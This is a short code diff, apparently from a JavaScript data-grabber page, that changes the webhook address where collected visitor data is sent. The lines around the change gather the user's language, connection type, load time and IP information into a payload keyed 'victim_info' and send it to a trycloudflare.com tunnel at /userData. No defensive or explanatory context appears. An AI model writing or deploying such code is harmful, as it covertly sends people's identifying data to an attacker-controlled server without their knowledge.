@@ -76,7 +76,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-            const webhookURL = "https://premises-hawaiian-originally-monaco.trycloudflare.com/userData";
+            const webhookURL = "https://firewall-translations-nashville-labels.trycloudflare.com/userData";
 
             const payload = {
                 'victim_info': ipinfo, 
